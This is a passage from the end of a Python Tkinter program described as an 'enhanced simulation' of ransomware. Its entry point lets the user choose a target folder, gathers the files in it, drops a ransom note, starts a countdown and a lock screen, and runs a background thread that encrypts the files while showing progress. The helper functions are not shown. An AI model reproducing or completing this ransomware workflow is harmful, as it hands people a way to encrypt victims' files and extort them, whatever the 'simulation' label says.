        except Exception:
            try:
                root.after(0, updater)
            except Exception:
                pass
        # small delay to make progress visible in demo
        time.sleep(0.05)
    # final set
    try:
        if files_encrypted_label and files_encrypted_label.winfo_exists():
            files_encrypted_label.config(text=f"📊 FILES ENCRYPTED: {TOTAL_FILES[0]} / {TOTAL_FILES[0]}")
    except Exception:
        pass
    print("[INFO] Encryption process completed.")

# ---- APPLICATION ENTRY ----
root = tk.Tk()
root.withdraw()  # Hide root while file dialog

if __name__ == "__main__":

    path = filedialog.askdirectory(title="📁 Select Target Folder for Enhanced Simulation")
    if not path:
        messagebox.showerror("Error", "No folder selected. Exiting.")
        root.destroy()
    else:
        TARGET_DIR["path"] = path
        stop_timer[0] = False
        FILES_TO_ENCRYPT[:] = list(get_target_files(path))
        TOTAL_FILES[0] = len(FILES_TO_ENCRYPT)
        ENCRYPTED_COUNT[0] = 0
        drop_ransom_note(path)
        save_countdown_state()
        show_enhanced_locked_screen()
        # Start encryption thread
        threading.Thread(target=encrypt_files_with_progress, daemon=True).start()
        root.mainloop()
